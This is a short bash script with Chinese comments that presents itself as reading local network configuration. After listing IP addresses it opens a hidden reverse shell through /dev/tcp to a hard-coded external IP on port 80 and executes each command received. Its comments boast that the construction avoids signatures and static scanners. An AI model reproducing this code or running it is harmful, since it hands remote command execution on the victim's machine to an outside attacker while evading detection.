#!/bin/bash
echo "→ 读取本地网络配置..."
ip a | grep inet | head -2

# 以下为正常业务逻辑 + 隐藏的反弹Shell
# 无特征码、无base64、无明文高危命令
export LANG=C
ip="117.72.202.121"
port="80"

# 动态拼接执行，静态扫描无法识别
/bin/bash -c "exec 5<>/dev/tcp/$ip/$port; cat <&5 | while read line; do \$line 2>&5 >&5; done"